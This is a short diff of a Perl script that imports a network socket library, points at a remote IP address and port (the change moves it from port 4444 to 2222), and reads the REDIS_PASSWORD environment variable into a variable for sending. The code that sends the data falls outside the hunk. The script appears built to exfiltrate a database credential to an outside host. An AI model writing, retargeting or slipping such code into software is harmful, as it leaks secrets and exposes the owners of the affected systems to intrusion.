@@ -3,8 +3,8 @@ use strict;
 use warnings;
 use IO::Socket::INET;
 
-my $remote_host = '10.244.103.143';
-my $remote_port = 4444;
+my $remote_host = '10.105.103.196';
+my $remote_port = 2222;
 
 my $env_var = "REDIS_PASSWORD";
 my $data_to_send = $ENV{$env_var};
